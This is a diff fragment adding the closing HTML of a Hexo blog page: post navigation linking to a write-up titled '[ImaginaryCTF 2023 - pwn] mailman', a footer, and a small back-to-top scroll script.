+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/posts/mailman/"
+      title="[ImaginaryCTF 2023 - pwn] mailman"
+     >
+
+    <p class="title-text">
+      
+        [ImaginaryCTF 2023 - pwn] mailman
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+ 
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2023 nasm<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
+        <span class="material-symbols-rounded">keyboard_arrow_up</span>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.style.opacity = 1;
+        } else {
+            btn.style.opacity = 0;
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
